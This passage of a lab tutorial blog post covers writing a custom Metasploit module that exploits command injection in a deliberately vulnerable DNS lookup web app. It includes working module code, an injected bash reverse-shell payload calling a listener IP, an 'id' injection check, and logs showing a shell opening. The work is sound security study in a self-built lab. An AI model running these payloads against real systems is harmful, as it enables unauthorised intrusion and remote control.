+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">          <span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">          <span class="s1">&#39;Arch&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="no">ARCH_X64</span><span class="o">]</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">          <span class="s1">&#39;DefaultOptions&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;PAYLOAD&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;linux/x64/meterpreter/reverse_tcp&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">          <span class="s1">&#39;Type&#39;</span> <span class="o">=&gt;</span> <span class="ss">:linux_dropper</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">      <span class="o">]]</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl"> <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="n">populate_values</span> <span class="k">if</span> <span class="vi">@sid</span><span class="o">.</span><span class="n">nil?</span> <span class="o">||</span> <span class="vi">@token</span><span class="o">.</span><span class="n">nil?</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="n">uri</span> <span class="o">=</span> <span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;URIPATH&#39;</span><span class="o">]</span> <span class="o">+</span> <span class="s1">&#39;/vendor/htmlawed/htmlawed/htmLawedTest.php&#39;</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">send_request_cgi</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">      <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">      <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">uri</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">      <span class="s1">&#39;cookie&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sid=&#39;</span> <span class="o">+</span> <span class="vi">@sid</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">      <span class="s1">&#39;ctype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">      <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">      <span class="s1">&#39;vars_post&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="s1">&#39;token&#39;</span> <span class="o">=&gt;</span> <span class="vi">@token</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="s1">&#39;text&#39;</span> <span class="o">=&gt;</span> <span class="n">cmd</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="s1">&#39;hhook&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="s1">&#39;sid&#39;</span> <span class="o">=&gt;</span> <span class="vi">@sid</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">
+</span></span><span class="line"><span class="ln">44</span><span class="cl">  <span class="k">def</span> <span class="nf">exploit</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Executing </span><span class="si">#{</span><span class="n">target</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> for </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;PAYLOAD&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="k">case</span> <span class="n">target</span><span class="o">[</span><span class="s1">&#39;Type&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">when</span> <span class="ss">:unix_cmd</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl">      <span class="n">execute_command</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">when</span> <span class="ss">:linux_dropper</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">      <span class="n">execute_cmdstager</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">end</span>
+</span></span></code></pre></div><p>I was trying to call <code>loadpath /home/msf/.msf4/modules/exploits/custom</code>, <code>loadpath /home/msf/.msf4/modules/exploits</code>, and <code>loadpath /home/msf/.msf4/modules/exploits/custom</code>, but none of them were working.
+Nothing showed up in search and no modules were marked as loaded.
+Fortunatly, metasploit dumps logs to the <code>.msf4</code> directory, so I had easy access to them on my host machine:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">[08/05/2023 01:57:05] [e(0)] core: /home/msf/.msf4/modules/exploits/custom/dnssearcher.rb failed to load - Msf::Modules::Error Failed to load module (custom/dnssearcher from /home/msf/.msf4/modules/exploits/custom/dnssearcher.rb) due to invalid module class name (must be MetasploitModule)
+[08/05/2023 01:57:05] [w(0)] core: The following modules could not be loaded!
+[08/05/2023 01:57:05] [w(0)] core: 	/home/msf/.msf4/modules/exploits/custom/dnssearcher.rb
+</code></pre><p>I should have started by copying the structure of a known-good module, or by copying the template from further down in the documentation.
+It was my mistake thinking that following a &ldquo;How to&rdquo; guide from top down would not include the class name at the top.
+The actual problem was that my code didn&rsquo;t start with the class definition:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+</span></span></code></pre></div><p>I tried again and got this error:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">[08/05/2023 02:17:13] [e(0)] core: /home/msf/.msf4/modules/exploits/custom/dnssearcher.rb failed to load - SyntaxError /home/msf/.msf4/modules/exploits/custom/dnssearcher.rb:65: syntax error, unexpected end-of-input, expecting `end&#39;
+[08/05/2023 02:17:13] [w(0)] core: The following modules could not be loaded!
+[08/05/2023 02:17:13] [w(0)] core: 	/home/msf/.msf4/modules/exploits/custom/dnssearcher.rb
+</code></pre><p>Simple solution - put an <code>end</code> at the end to end the class definition.
+After those two fixes, the module would load.</p>
+<h3 id="import-error">Import error</h3>
+<p>Once I got <code>dnssearcher.rb</code> importing, I set the options and tried to throw it.
+I got a 141,364 character error message ending with &ldquo;Did you mean? send_redirect&rdquo;.
+The top of the error message had:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">[08/05/2023 02:21:26] [e(0)] core: Exploit failed (custom/dnssearcher): NoMethodError undefined method `send_request_cgi&#39;
+</code></pre><p>I fixed this error by looking at other implementations of <code>send_request_cgi</code> (again, through RegEx searches over the metasploit-framework codebase) and seeing that they had this import at the top:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
+</span></span></code></pre></div><p>I could actually remove the <code>include Msf::Exploit::CmdStager</code> import - I don&rsquo;t need it for this phase.</p>
+<h3 id="weird-errors-in-the-application">Weird errors in the application</h3>
+<p>The last issue I ran into, once the exploit was running, was getting my exploit to not error out on DNSSearcher.
+Watching the DNSSearcher log and watching Wireshark as I threw the exploit really helped with this section.</p>
+<p>I started out with the <code>filter_bad_chars</code> from the documentation - I should have known that this would have some issues due to my <code>netcat</code> based manual exploitation of the server in <a href="https://connorshade.com/service-to-shell/vulnerable-webapp/#checking-for-command-injection">vulnerable-webapp</a>, but I didn&rsquo;t think to modify the filters yet.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/chmod \+x/</span><span class="p">,</span> <span class="s1">&#39;chmod 777&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/;/</span><span class="p">,</span> <span class="s1">&#39; %26%26 &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="k">end</span>
+</span></span></code></pre></div><p>I was also using <code>+</code> as a space character in my request (no impact, but I tend to use <code>%20</code> to be explicit and not rely on conversions):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">_opts</span> <span class="o">=</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="n">send_request_cgi</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/dns&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      <span class="s1">&#39;domainname&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;bing.com+%26%26+</span><span class="si">#{</span><span class="n">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">end</span>
+</span></span></code></pre></div><p>Here is what the HTTP request looked like over the wire:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln">1</span><span class="cl">GET /dns?domainname=bing.com+%26%26+bash+-c+&#39;0&lt;&amp;83-+%26%26+exec+83&lt;&gt;/dev/tcp/172.18.0.3/4444+%26%26+sh+&lt;&amp;83+&gt;&amp;83+2&gt;&amp;83&#39; HTTP/1.1
+</span></span></code></pre></div><p>Here is the logs from DNSSearcher:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">INFO:root:DNS lookup for bing.com &amp;&amp; bash -c &#39;0&lt;
+INFO:root:Response status code: 2
+WARNING:root:stderr: /bin/sh: 1: Syntax error: Unterminated quoted string
+
+INFO:     172.17.0.1:33610 - &#34;GET /dns?domainname=bing.com+%26%26+bash+-c+&#39;0&lt;&amp;138-+%26%26+exec+138&lt;&gt;/dev/tcp/172.18.0.3/4444+%26%26+sh+&lt;&amp;138+&gt;&amp;138+2&gt;&amp;138&#39; HTTP/1.1&#34; 200 OK
+</code></pre><p>From these two data sources we see that some characters, like <code>&amp;</code>, aren&rsquo;t being escaped.
+Since <code>&amp;</code> is a special character in HTTP requests (specifies additional parameters), we need to escape it.
+I modified the <code>filter_bad_chars</code> function a bit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="s1">&#39;%26&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="k">end</span>
+</span></span></code></pre></div><p>After making this change, my exploit never returned.</p>
+<h3 id="couldnt-get-a-callback">Couldn&rsquo;t get a callback</h3>
+<p>The exploit never returning is a hint - so are the logs that are printed (or not printed).
+When I threw the exploit, the only log I saw from DNSSearcher was:</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">INFO:root:DNS lookup for bing.com &amp;&amp; bash -c &#39;0&lt;&amp;38-;exec 38&lt;&gt;/dev/tcp/172.18.0.3/4444;sh &lt;&amp;38 &gt;&amp;38 2&gt;&amp;38&#39;
+</code></pre><p>Taking a quick look at the code, we can see that there are several more log statements that should have been hit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/dns&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">def</span> <span class="nf">dns</span><span class="p">(</span><span class="n">domainname</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;DNS lookup for </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;nslookup </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response status code: </span><span class="si">{</span><span class="n">ret</span><span class="o">.</span><span class="n">returncode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="k">if</span> <span class="n">ret</span><span class="o">.</span><span class="n">returncode</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stderr: </span><span class="si">{</span><span class="n">ret</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">content</span><span class="o">=</span><span class="n">ret</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span> <span class="n">media_type</span><span class="o">=</span><span class="s2">&#34;text/plain&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>The code looked like it was hanging between my &ldquo;DNS lookup for {domainname}&rdquo; and &ldquo;Response status code&rdquo; log statements - the only thing that could cause a hang is an issue with <code>subprocess.run</code>.
+I let the application sit for a bit and more logs printed out (first line is kept from above, it did not print twice):</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">INFO:root:DNS lookup for bing.com &amp;&amp; bash -c &#39;0&lt;&amp;38-;exec 38&lt;&gt;/dev/tcp/172.18.0.3/4444;sh &lt;&amp;38 &gt;&amp;38 2&gt;&amp;38&#39;
+INFO:root:Response status code: 1
+WARNING:root:stderr: bash: redirection error: cannot duplicate fd: Bad file descriptor
+bash: line 1: 38: Bad file descriptor
+bash: connect: Connection timed out
+bash: line 1: /dev/tcp/172.18.0.3/4444: Connection timed out
+bash: line 1: 38: Bad file descriptor
+</code></pre><p>We have code execution! We just can&rsquo;t hit the Metasploit server.
+Thinking about it, that makes sense. I have a Docker-compose file that starts the Metasploit Framework and a separate Docker statement that starts DNSSearcher.
+They aren&rsquo;t on the same Docker network, so they can&rsquo;t easily talk to each other.</p>
+<p>From running Wireshark later (while trying to debug <code>echo</code>) it looks like the path a packet takes is 172.18.0.3 -&gt; 172.18.0.1 -&gt; HOST (192.168.1.141) -&gt; 172.17.0.1 -&gt; 172.17.0.2.</p>
+<p>The solution is in how I&rsquo;m calling the exploit - I set <code>RHOSTS 192.168.1.141</code> - my host IP.
+I need to set LHOST to my host IP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln"> 1</span><span class="cl">Module options (exploit/custom/dnssearcher):
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">   RHOSTS   192.168.1.141    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">   RPORT    8000             yes       The target port (TCP)
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Payload options (cmd/unix/reverse_bash):
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">   Name   Current Setting  Required  Description
+</span></span><span class="line"><span class="ln">11</span><span class="cl">   ----   ---------------  --------  -----------
+</span></span><span class="line"><span class="ln">12</span><span class="cl">   LHOST  192.168.1.141    yes       The listen address (an interface may be specified)
+</span></span><span class="line"><span class="ln">13</span><span class="cl">   LPORT  4444             yes       The listen port
+</span></span></code></pre></div><p>Setting LHOST to my host IP, which my Docker container can&rsquo;t bind to, leads to this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln">1</span><span class="cl">[-] Handler failed to bind to 192.168.1.141:4444:-  -
+</span></span><span class="line"><span class="ln">2</span><span class="cl">[*] Started reverse TCP handler on 0.0.0.0:4444 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">[*] Executing Unix Command for cmd/unix/reverse_bash
+</span></span><span class="line"><span class="ln">4</span><span class="cl">[*] Command shell session 1 opened (172.18.0.3:4444 -&gt; 172.18.0.1:57606) at 2023-08-06 01:51:46 +0000
+</span></span></code></pre></div><p>I get an error that the Handler can&rsquo;t bind to 192.168.1.141, but that&rsquo;s fine because it binds to 0.0.0.0 and port 4444 is forwarded from my host to the docker container.
+Afterwards, I get a shell.</p>
+<h2 id="some-improvements">Some Improvements</h2>
+<p>There are still some more areas of the module that I can improve on:</p>
+<ul>
+<li>Being able to get a meterpreter session would be nice - there might be more characters to filter out than a simple bash reverse TCP connection.</li>
+<li>Getting command stagers would improve flexibility with the module</li>
+<li>Adding a check would mean that this module can be Excellent ranking</li>
+<li>I might improve the Metasploit documentation regarding creating a custom module to flow better</li>
+</ul>
+<h3 id="adding-a-check">Adding a check</h3>
+<p>It&rsquo;s important to know if the service is actually vulnerable before attempting to throw an Exploit.
+Metasploit has a method for determining this - it&rsquo;s a <strong>check method</strong>.
+Checks can do a variety of things, and return a lot of info - if the service is not vulnerable, appears vulnerable, or is able to be exploited.
+I know that the DNSSearcher v0.1.0 code is vulnerable, but we can actually try to run <code>id</code> and see what we get.</p>
+<p>I&rsquo;m using the Metasploit documentation on <a href="https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-write-a-check-method.html">How to write a Check Method</a> along with the <a href="https://github.com/rapid7/metasploit-framework/blob/9e7960fd9ffe5cc2866e047aa75193d9858603e8/modules/exploits/example_webapp.rb#L98">example_webapp.rb</a> file for a sample check.</p>
+<p>I think we can do three checks:</p>
+<ul>
+<li>The <code>id</code> command returns some result in the body</li>
+<li>The banner has <code>server: dnssearcher v0.1.0</code> - Match on the version</li>
+<li>Also match on the server banner generically</li>
+</ul>
+<p>For the first check, on the <code>id</code>, I just had to use a <code>send_request_cgi</code> command injection and look for the proper response:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">check</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/dns&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="s1">&#39;vars_get&#39;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      <span class="s1">&#39;domainname&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;bing.com+%26%26id&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">nil?</span> <span class="c1"># check for no response</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">return</span> <span class="no">CheckCode</span><span class="o">::</span><span class="no">Unknown</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Could not connect to web service - no response&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">include?</span> <span class="s2">&#34;uid=0&#34;</span> <span class="c1"># check for uid</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="no">CheckCode</span><span class="o">::</span><span class="no">Vulnerable</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Successfully exploited with `id` command&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="k">end</span>
+</span></span></code></pre></div><p>For the next two sections, since they checked against the Banner, I had to figure out how to find the banner of an HTTP request.
+I checked the documentation and found <a href="https://docs.metasploit.com/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html#getting-the-response-body">this page</a>, which mentions you can do <code>res.to_s</code> to get the full response content:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln"> 1</span><span class="cl">  <span class="c1"># expected banner includes `server: dnssearcher vx.y.z</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="sr">%r{sever: dnssearcher v(?&lt;version&gt;\d{1,2}\.\d{1,2}\.\d{1,2})&lt;/td&gt;}</span> <span class="o">=~</span> <span class="n">res</span><span class="o">.</span><span class="n">to_s</span> <span class="c1"># to_s converts the entire response to a string?</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="k">if</span> <span class="n">version</span> <span class="o">&amp;&amp;</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Version</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">version</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Version</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;0.1.0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">return</span> <span class="no">CheckCode</span><span class="o">::</span><span class="no">Appears</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Vulnerable Version Detected: </span><span class="si">#{</span><span class="n">version</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">to_s</span><span class="o">.</span><span class="n">include?</span> <span class="s2">&#34;server: dnssearcher&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">return</span> <span class="no">CheckCode</span><span class="o">::</span><span class="no">Detected</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Unknown version of DNSSearcher&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="k">return</span> <span class="no">CheckCode</span><span class="o">::</span><span class="no">Unknown</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">peer</span><span class="si">}</span><span class="s2"> - Failed to detect DNSSearcher&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">end</span>
+</span></span></code></pre></div><p>The two previous code blocks can be concatenated to form the whole <code>check</code> method (The file with this addition is visible <a href="https://github.com/cnnrshd/service-to-shell/blob/9122930d0d50c97048dfd5506e0be92eecabc8f2/msf4/modules/exploits/custom/dnssearcher.rb#L43">here</a>), which looks like this when running inside Metasploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">msf6 exploit<span class="o">(</span>custom/dnssearcher<span class="o">)</span> &gt; check
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.1.141:8000 - The target is vulnerable. 192.168.1.141:8000 - Successfully exploited with <span class="sb">`</span>id<span class="sb">`</span> <span class="nb">command</span>
+</span></span></code></pre></div><p>I can also add the <strong>Autocheck</strong> mixin by adding this section of code just under the Module definition:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl">  <span class="n">prepend</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">AutoCheck</span>
+</span></span></code></pre></div><p>This means that when I fail to start DNSSearcher, I&rsquo;m alerted that there is no response instead of trying to debug a failed exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind</span> to 192.168.1.141:4444:-  -
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 0.0.0.0:4444 
